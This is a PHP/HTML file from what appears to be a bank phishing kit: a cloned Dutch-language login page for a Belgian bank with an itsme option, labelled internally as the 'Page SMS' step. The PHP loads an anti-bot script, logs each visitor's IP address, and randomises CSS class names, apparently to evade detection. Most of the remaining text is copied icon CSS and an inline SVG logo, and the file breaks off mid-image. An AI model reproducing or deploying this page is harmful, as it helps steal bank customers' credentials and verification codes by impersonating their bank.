<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page SMS";
    get_page_info($get_name_page, $get_name_file);

    $rendom_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<html class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> notranslate" translate="no" lang="nl" data-react-helmet="lang">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="google" content="notranslate" />
    <style type="text/css">
        :root,
        :host {
            --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
            --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
            --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
            --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
            --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
            --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
            --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
        }

        svg:not(:root).svg-inline--fa,
        svg:not(:host).svg-inline--fa {
            overflow: visible;
            box-sizing: content-box;
        }

        .svg-inline--fa {
            display: var(--fa-display, inline-block);
            height: 1em;
            overflow: visible;
            vertical-align: -0.125em;
        }

        .svg-inline--fa.fa-2xs {
            vertical-align: 0.1em;
        }

        .svg-inline--fa.fa-xs {
            vertical-align: 0em;
        }

        .svg-inline--fa.fa-sm {
            vertical-align: -0.0714285705em;
        }

        .svg-inline--fa.fa-lg {
            vertical-align: -0.2em;
        }

        .svg-inline--fa.fa-xl {
            vertical-align: -0.25em;
        }

        .svg-inline--fa.fa-2xl {
            vertical-align: -0.3125em;
        }

        .svg-inline--fa.fa-pull-left {
            margin-right: var(--fa-pull-margin, 0.3em);
            width: auto;
        }

        .svg-inline--fa.fa-pull-right {
            margin-left: var(--fa-pull-margin, 0.3em);
            width: auto;
        }

        .svg-inline--fa.fa-li {
            width: var(--fa-li-width, 2em);
            top: 0.25em;
        }

        .svg-inline--fa.fa-fw {
            width: var(--fa-fw-width, 1.25em);
        }

        .fa-layers svg.svg-inline--fa {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
        }

        .fa-layers-counter,
        .fa-layers-text {
            display: inline-block;
            position: absolute;
            text-align: center;
        }

        .fa-layers {
            display: inline-block;
            height: 1em;
            position: relative;
            text-align: center;
            vertical-align: -0.125em;
            width: 1em;
        }

        .fa-layers svg.svg-inline--fa {
            -webkit-transform-origin: center center;
            transform-origin: center center;
        }

        .fa-layers-text {
            left: 50%;
            top: 50%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            -webkit-transform-origin: center center;
            transform-origin: center center;
        }

        .fa-layers-counter {
            background-color: var(--fa-counter-background-color, #ff253a);
            border-radius: var(--fa-counter-border-radius, 1em);
            box-sizing: border-box;
            color: var(--fa-inverse, #fff);
            line-height: var(--fa-counter-line-height, 1);
            max-width: var(--fa-counter-max-width, 5em);
            min-width: var(--fa-counter-min-width, 1.5em);
            overflow: hidden;
            padding: var(--fa-counter-padding, 0.25em 0.5em);
            right: var(--fa-right, 0);
            text-overflow: ellipsis;
            top: var(--fa-top, 0);
            -webkit-transform: scale(var(--fa-counter-scale, 0.25));
            transform: scale(var(--fa-counter-scale, 0.25));
            -webkit-transform-origin: top right;
            transform-origin: top right;
        }

        .fa-layers-bottom-right {
            bottom: var(--fa-bottom, 0);
            right: var(--fa-right, 0);
            top: auto;
            -webkit-transform: scale(var(--fa-layers-scale, 0.25));
            transform: scale(var(--fa-layers-scale, 0.25));
            -webkit-transform-origin: bottom right;
            transform-origin: bottom right;
        }

        .fa-layers-bottom-left {
            bottom: var(--fa-bottom, 0);
            left: var(--fa-left, 0);
            right: auto;
            top: auto;
            -webkit-transform: scale(var(--fa-layers-scale, 0.25));
            transform: scale(var(--fa-layers-scale, 0.25));
            -webkit-transform-origin: bottom left;
            transform-origin: bottom left;
        }

        .fa-layers-top-right {
            top: var(--fa-top, 0);
            right: var(--fa-right, 0);
            -webkit-transform: scale(var(--fa-layers-scale, 0.25));
            transform: scale(var(--fa-layers-scale, 0.25));
            -webkit-transform-origin: top right;
            transform-origin: top right;
        }

        .fa-layers-top-left {
            left: var(--fa-left, 0);
            right: auto;
            top: var(--fa-top, 0);
            -webkit-transform: scale(var(--fa-layers-scale, 0.25));
            transform: scale(var(--fa-layers-scale, 0.25));
            -webkit-transform-origin: top left;
            transform-origin: top left;
        }

        .fa-1x {
            font-size: 1em;
        }

        .fa-2x {
            font-size: 2em;
        }

        .fa-3x {
            font-size: 3em;
        }

        .fa-4x {
            font-size: 4em;
        }

        .fa-5x {
            font-size: 5em;
        }

        .fa-6x {
            font-size: 6em;
        }

        .fa-7x {
            font-size: 7em;
        }

        .fa-8x {
            font-size: 8em;
        }

        .fa-9x {
            font-size: 9em;
        }

        .fa-10x {
            font-size: 10em;
        }

        .fa-2xs {
            font-size: 0.625em;
            line-height: 0.1em;
            vertical-align: 0.225em;
        }

        .fa-xs {
            font-size: 0.75em;
            line-height: 0.0833333337em;
            vertical-align: 0.125em;
        }

        .fa-sm {
            font-size: 0.875em;
            line-height: 0.0714285718em;
            vertical-align: 0.0535714295em;
        }

        .fa-lg {
            font-size: 1.25em;
            line-height: 0.05em;
            vertical-align: -0.075em;
        }

        .fa-xl {
            font-size: 1.5em;
            line-height: 0.0416666682em;
            vertical-align: -0.125em;
        }

        .fa-2xl {
            font-size: 2em;
            line-height: 0.03125em;
            vertical-align: -0.1875em;
        }

        .fa-fw {
            text-align: center;
            width: 1.25em;
        }

        .fa-ul {
            list-style-type: none;
            margin-left: var(--fa-li-margin, 2.5em);
            padding-left: 0;
        }

        .fa-ul>li {
            position: relative;
        }

        .fa-li {
            left: calc(var(--fa-li-width, 2em) * -1);
            position: absolute;
            text-align: center;
            width: var(--fa-li-width, 2em);
            line-height: inherit;
        }

        .fa-border {
            border-color: var(--fa-border-color, #eee);
            border-radius: var(--fa-border-radius, 0.1em);
            border-style: var(--fa-border-style, solid);
            border-width: var(--fa-border-width, 0.08em);
            padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
        }

        .fa-pull-left {
            float: left;
            margin-right: var(--fa-pull-margin, 0.3em);
        }

        .fa-pull-right {
            float: right;
            margin-left: var(--fa-pull-margin, 0.3em);
        }

        .fa-beat {
            -webkit-animation-name: fa-beat;
            animation-name: fa-beat;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
            animation-timing-function: var(--fa-animation-timing, ease-in-out);
        }

        .fa-bounce {
            -webkit-animation-name: fa-bounce;
            animation-name: fa-bounce;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
            animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
        }

        .fa-fade {
            -webkit-animation-name: fa-fade;
            animation-name: fa-fade;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
            animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        }

        .fa-beat-fade {
            -webkit-animation-name: fa-beat-fade;
            animation-name: fa-beat-fade;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
            animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        }

        .fa-flip {
            -webkit-animation-name: fa-flip;
            animation-name: fa-flip;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
            animation-timing-function: var(--fa-animation-timing, ease-in-out);
        }

        .fa-shake {
            -webkit-animation-name: fa-shake;
            animation-name: fa-shake;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, linear);
            animation-timing-function: var(--fa-animation-timing, linear);
        }

        .fa-spin {
            -webkit-animation-name: fa-spin;
            animation-name: fa-spin;
            -webkit-animation-delay: var(--fa-animation-delay, 0s);
            animation-delay: var(--fa-animation-delay, 0s);
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 2s);
            animation-duration: var(--fa-animation-duration, 2s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, linear);
            animation-timing-function: var(--fa-animation-timing, linear);
        }

        .fa-spin-reverse {
            --fa-animation-direction: reverse;
        }

        .fa-pulse,
        .fa-spin-pulse {
            -webkit-animation-name: fa-spin;
            animation-name: fa-spin;
            -webkit-animation-direction: var(--fa-animation-direction, normal);
            animation-direction: var(--fa-animation-direction, normal);
            -webkit-animation-duration: var(--fa-animation-duration, 1s);
            animation-duration: var(--fa-animation-duration, 1s);
            -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
            animation-timing-function: var(--fa-animation-timing, steps(8));
        }

        @media (prefers-reduced-motion: reduce) {

            .fa-beat,
            .fa-bounce,
            .fa-fade,
            .fa-beat-fade,
            .fa-flip,
            .fa-pulse,
            .fa-shake,
            .fa-spin,
            .fa-spin-pulse {
                -webkit-animation-delay: -1ms;
                animation-delay: -1ms;
                -webkit-animation-duration: 1ms;
                animation-duration: 1ms;
                -webkit-animation-iteration-count: 1;
                animation-iteration-count: 1;
                -webkit-transition-delay: 0s;
                transition-delay: 0s;
                -webkit-transition-duration: 0s;
                transition-duration: 0s;
            }
        }

        @-webkit-keyframes fa-beat {

            0%,
            90% {
                -webkit-transform: scale(1);
                transform: scale(1);
            }

            45% {
                -webkit-transform: scale(var(--fa-beat-scale, 1.25));
                transform: scale(var(--fa-beat-scale, 1.25));
            }
        }

        @keyframes fa-beat {

            0%,
            90% {
                -webkit-transform: scale(1);
                transform: scale(1);
            }

            45% {
                -webkit-transform: scale(var(--fa-beat-scale, 1.25));
                transform: scale(var(--fa-beat-scale, 1.25));
            }
        }

        @-webkit-keyframes fa-bounce {
            0% {
                -webkit-transform: scale(1, 1) translateY(0);
                transform: scale(1, 1) translateY(0);
            }

            10% {
                -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
                transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            }

            30% {
                -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
                transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            }

            50% {
                -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
                transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            }

            57% {
                -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
                transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            }

            64% {
                -webkit-transform: scale(1, 1) translateY(0);
                transform: scale(1, 1) translateY(0);
            }

            100% {
                -webkit-transform: scale(1, 1) translateY(0);
                transform: scale(1, 1) translateY(0);
            }
        }

        @keyframes fa-bounce {
            0% {
                -webkit-transform: scale(1, 1) translateY(0);
                transform: scale(1, 1) translateY(0);
            }

            10% {
                -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
                transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            }

            30% {
                -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
                transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            }

            50% {
                -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
                transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            }

            57% {
                -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
                transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            }

            64% {
                -webkit-transform: scale(1, 1) translateY(0);
                transform: scale(1, 1) translateY(0);
            }

            100% {
                -webkit-transform: scale(1, 1) translateY(0);
                transform: scale(1, 1) translateY(0);
            }
        }

        @-webkit-keyframes fa-fade {
            50% {
                opacity: var(--fa-fade-opacity, 0.4);
            }
        }

        @keyframes fa-fade {
            50% {
                opacity: var(--fa-fade-opacity, 0.4);
            }
        }

        @-webkit-keyframes fa-beat-fade {

            0%,
            100% {
                opacity: var(--fa-beat-fade-opacity, 0.4);
                -webkit-transform: scale(1);
                transform: scale(1);
            }

            50% {
                opacity: 1;
                -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
                transform: scale(var(--fa-beat-fade-scale, 1.125));
            }
        }

        @keyframes fa-beat-fade {

            0%,
            100% {
                opacity: var(--fa-beat-fade-opacity, 0.4);
                -webkit-transform: scale(1);
                transform: scale(1);
            }

            50% {
                opacity: 1;
                -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
                transform: scale(var(--fa-beat-fade-scale, 1.125));
            }
        }

        @-webkit-keyframes fa-flip {
            50% {
                -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
                transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            }
        }

        @keyframes fa-flip {
            50% {
                -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
                transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            }
        }

        @-webkit-keyframes fa-shake {
            0% {
                -webkit-transform: rotate(-15deg);
                transform: rotate(-15deg);
            }

            4% {
                -webkit-transform: rotate(15deg);
                transform: rotate(15deg);
            }

            8%,
            24% {
                -webkit-transform: rotate(-18deg);
                transform: rotate(-18deg);
            }

            12%,
            28% {
                -webkit-transform: rotate(18deg);
                transform: rotate(18deg);
            }

            16% {
                -webkit-transform: rotate(-22deg);
                transform: rotate(-22deg);
            }

            20% {
                -webkit-transform: rotate(22deg);
                transform: rotate(22deg);
            }

            32% {
                -webkit-transform: rotate(-12deg);
                transform: rotate(-12deg);
            }

            36% {
                -webkit-transform: rotate(12deg);
                transform: rotate(12deg);
            }

            40%,
            100% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
        }

        @keyframes fa-shake {
            0% {
                -webkit-transform: rotate(-15deg);
                transform: rotate(-15deg);
            }

            4% {
                -webkit-transform: rotate(15deg);
                transform: rotate(15deg);
            }

            8%,
            24% {
                -webkit-transform: rotate(-18deg);
                transform: rotate(-18deg);
            }

            12%,
            28% {
                -webkit-transform: rotate(18deg);
                transform: rotate(18deg);
            }

            16% {
                -webkit-transform: rotate(-22deg);
                transform: rotate(-22deg);
            }

            20% {
                -webkit-transform: rotate(22deg);
                transform: rotate(22deg);
            }

            32% {
                -webkit-transform: rotate(-12deg);
                transform: rotate(-12deg);
            }

            36% {
                -webkit-transform: rotate(12deg);
                transform: rotate(12deg);
            }

            40%,
            100% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        .fa-rotate-90 {
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg);
        }

        .fa-rotate-180 {
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg);
        }

        .fa-rotate-270 {
            -webkit-transform: rotate(270deg);
            transform: rotate(270deg);
        }

        .fa-flip-horizontal {
            -webkit-transform: scale(-1, 1);
            transform: scale(-1, 1);
        }

        .fa-flip-vertical {
            -webkit-transform: scale(1, -1);
            transform: scale(1, -1);
        }

        .fa-flip-both,
        .fa-flip-horizontal.fa-flip-vertical {
            -webkit-transform: scale(-1, -1);
            transform: scale(-1, -1);
        }

        .fa-rotate-by {
            -webkit-transform: rotate(var(--fa-rotate-angle, none));
            transform: rotate(var(--fa-rotate-angle, none));
        }

        .fa-stack {
            display: inline-block;
            vertical-align: middle;
            height: 2em;
            position: relative;
            width: 2.5em;
        }

        .fa-stack-1x,
        .fa-stack-2x {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
            z-index: var(--fa-stack-z-index, auto);
        }

        .svg-inline--fa.fa-stack-1x {
            height: 1em;
            width: 1.25em;
        }

        .svg-inline--fa.fa-stack-2x {
            height: 2em;
            width: 2.5em;
        }

        .fa-inverse {
            color: var(--fa-inverse, #fff);
        }

        .sr-only,
        .fa-sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }

        .sr-only-focusable:not(:focus),
        .fa-sr-only-focusable:not(:focus) {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }

        .svg-inline--fa .fa-primary {
            fill: var(--fa-primary-color, currentColor);
            opacity: var(--fa-primary-opacity, 1);
        }

        .svg-inline--fa .fa-secondary {
            fill: var(--fa-secondary-color, currentColor);
            opacity: var(--fa-secondary-opacity, 0.4);
        }

        .svg-inline--fa.fa-swap-opacity .fa-primary {
            opacity: var(--fa-secondary-opacity, 0.4);
        }

        .svg-inline--fa.fa-swap-opacity .fa-secondary {
            opacity: var(--fa-primary-opacity, 1);
        }

        .svg-inline--fa mask .fa-primary,
        .svg-inline--fa mask .fa-secondary {
            fill: black;
        }

        .fad.fa-inverse,
        .fa-duotone.fa-inverse {
            color: var(--fa-inverse, #fff);
        }
        </style>
        <link rel="shortcut icon" href="./favicon.png" />
        <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="apple-itunes-app" content="app-id=893585833" />
        <link rel="manifest" href="./manifest.json" />
        <title>Home | Login</title>
        <link href="./files/main.4393a533.css" rel="stylesheet" />
        <style data-emotion="css" data-s=""></style>
    </head>

    <body>
        <div id="root">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-container">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login-page">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login-page-wrapper">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login-page-content-center">
                            <header class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> grid grid--justifyCenter">
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> grid__cell grid__cell--lg-12">
                                    <nav aria-label="Smart link opties" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link-navigation">
                                        <ul class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link-navigation__content">
                                            <li>
                                                <a href="aanmelden#itsme" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link">
                                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link__content">
                                                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-icon">
                                                            <img alt="Itsme" aria-hidden="true"
                                                                src="data:image/svg+xml,%3c?xml%20version=%271.0%27%20encoding=%27UTF-8%27?%3e%3csvg%20width=%2724px%27%20height=%2724px%27%20viewBox=%270%200%2049%2048%27%20version=%271.1%27%20xmlns=%27http://www.w3.org/2000/svg%27%20xmlns:xlink=%27http://www.w3.org/1999/xlink%27%3e%3ctitle%3eitsme%3c/title%3e%3cg%20id=%27Aanmeldpagina%27%20stroke=%27none%27%20stroke-width=%271%27%20fill=%27none%27%20fill-rule=%27evenodd%27%3e%3cg%20id=%27(Mobile)-Internetbankieren---Itsme---01%27%20transform=%27translate(-32.000000,%20-270.000000)%27%20fill-rule=%27nonzero%27%3e%3cg%20id=%27Group-11%27%20transform=%27translate(16.000000,%20259.000000)%27%3e%3cg%20id=%27Lists-/-Accordions-/-IB-Copy-3%27%20transform=%27translate(-16.869347,%20-1.000000)%27%3e%3cg%20id=%27itsme%27%20transform=%27translate(33.000000,%2012.000000)%27%3e%3cpath%20d=%27M2.54202855,34.4111817%20C0.42814528,32.0444902%20-0.437020857,28.8151049%200.210597867,25.7087054%20L4.25086126,10.6217639%20C5.24346204,7.60741144%207.60797826,5.24307138%2010.6225553,4.25054456%20L25.7106209,0.210582177%20C28.8172519,-0.436988297%2032.0468778,0.428113382%2034.4137457,2.54183916%20L45.4483011,13.5888183%20C47.5649869,15.954147%2048.4348821,19.1828396%2047.7929785,22.2912946%20L43.7394684,37.3649903%20C42.7495776,40.3763471%2040.3905356,42.7401276%2037.3810211,43.7362097%20L22.2797087,47.7894178%20C19.1730777,48.4369883%2015.9434519,47.5718866%2013.576584,45.4581608%20L2.54202855,34.4111817%20Z%27%20id=%27Path%27%20fill=%27%23FF4612%27%3e%3c/path%3e%3cpath%20d=%27M29.1352905,17.1028036%20C27.7013001,16.615169%2026.7851396,16.4306587%2026.851528,15.5871827%20C26.9046388,14.9282171%2027.409191,14.5855549%2028.3253515,14.6646308%20C28.9892359,14.7173481%2029.414122,14.9941136%2029.6132873,15.4026723%20C29.8756785,15.9321016%2030.4131645,16.2725278%2031.0074446,16.2856862%20C32.3484912,16.3120449%2033.1717079,14.7700653%2032.3352135,13.7288996%20C31.5783853,12.8063477%2030.3302825,12.1737407%2028.5776276,12.0287683%20C25.4972037,11.80472%2023.5586612,13.1621892%2023.3860512,15.4949275%20C23.1868859,17.9858175%2024.8731524,18.6579625%2027.4224686,19.5146178%20C29.1751236,20.0681489%2029.6000096,20.3317352%2029.5468989,21.0697767%20C29.4937881,21.7682802%2028.8830144,22.1241217%2027.9270208,22.0450458%20C27.1303595,21.9923285%2026.6523627,21.676025%2026.426642,21.2147491%20C26.1453516,20.6973958%2025.5981639,20.3776069%2025.0059293,20.3844524%20C24.5669525,20.3745846%2024.1436357,20.5464765%2023.8374926,20.8589077%20C23.8374926,20.8589077%2023.1736082,21.5969492%2021.8856724,21.5969492%20C20.9429565,21.5705905%2020.106462,21.0697767%2020.106462,19.7518454%20L20.1330174,15.3763137%20C20.8142083,15.7915895%2021.6851915,15.7353292%2022.3064143,15.2359254%20C22.9276371,14.7365216%2023.1640433,13.9025465%2022.8963274,13.1548762%20C22.6286116,12.407206%2021.9149762,11.9083869%2021.1155664,11.9101545%20C20.7786362,11.9097534%2020.4480238,12.0009098%2020.1595728,12.1737407%20L20.1595728,10.5922232%20C20.1595728,10.0244821%2019.6958921,9.56423688%2019.1239131,9.56423688%20L17.7297557,9.56423688%20C17.162922,9.56423688%2016.7013631,10.0164562%2016.694096,10.5790439%20L16.6277076,19.9758937%20C16.5347637,21.1356732%2015.7248247,21.5969492%2014.8086642,21.5969492%20C13.8526706,21.5969492%2012.9763431,21.0961353%2012.9763431,19.7518454%20L13.0427315,13.8211548%20C13.0427315,13.4499394%2012.7395557,13.1490099%2012.3655694,13.1490099%20L10.2676946,13.1490099%20C10.0858106,13.1454693%209.91014095,13.2147182%209.78026207,13.3411556%20C9.65038319,13.467593%209.57721977,13.6405837%209.57725474,13.8211548%20L9.51063307,20.5953214%20C9.48431092,23.4156943%2011.7282403,24.6809083%2014.8219419,24.6809083%20C16.1098777,24.6809083%2016.9862052,24.1537358%2017.6102565,23.4420529%20C18.3803625,24.2855289%2019.6019099,24.6809083%2021.089011,24.6809083%20C22.5761122,24.6809083%2023.6781604,24.4832186%2024.7802085,23.8637909%20C25.6785513,24.3533112%2026.6776351,24.632785%2027.7013001,24.6809083%20C30.8879454,24.9313152%2032.8397657,23.4947702%2033.0256534,21.0302387%20C33.1982633,18.8161142%2031.5252745,17.9331003%2029.1352905,17.1159829%20L29.1352905,17.1028036%20Z%20M11.3962981,11.6333889%20C12.1600883,11.6333889%2012.8484103,11.1759638%2013.1394442,10.4750269%20C13.4304781,9.77408994%2013.26672,8.96811714%2012.7247337,8.43393507%20C12.1827475,7.899753%2011.3696215,7.7429081%2010.6655269,8.03673204%20C9.9614322,8.33055598%209.50548749,9.01699352%209.5108663,9.77510588%20C9.518163,10.8035355%2010.3601662,11.6333889%2011.3962981,11.6333889%20L11.3962981,11.6333889%20Z%20M33.5700386,25.4584877%20C30.4763371,25.4584877%2028.1527415,27.1717983%2027.5154125,30.0976057%20C27.3428025,27.3563087%2025.5901476,25.722074%2023.0009982,25.722074%20C21.5181837,25.6434059%2020.1076309,26.3636021%2019.3098007,27.6067156%20C18.4790869,26.365464%2017.0517284,25.6495631%2015.5522148,25.722074%20C14.0252805,25.722074%209.20547945,25.5375636%209.20547945,31.6923025%20L9.20547945,36.1600894%20C9.20547945,37.0881279%209.96341899,37.8404518%2010.8983848,37.8404518%20C11.8333506,37.8404518%2012.5912901,37.0881279%2012.5912901,36.1600894%20L12.5912901,31.2573852%20C12.5912901,29.8340194%2013.4012291,28.8719296%2014.7422757,28.8719296%20C15.9771008,28.8719296%2016.694096,29.7154056%2016.694096,31.2442059%20L16.694096,36.1864481%20C16.694096,37.1144866%2017.4520355,37.8668104%2018.3870013,37.8668104%20C19.321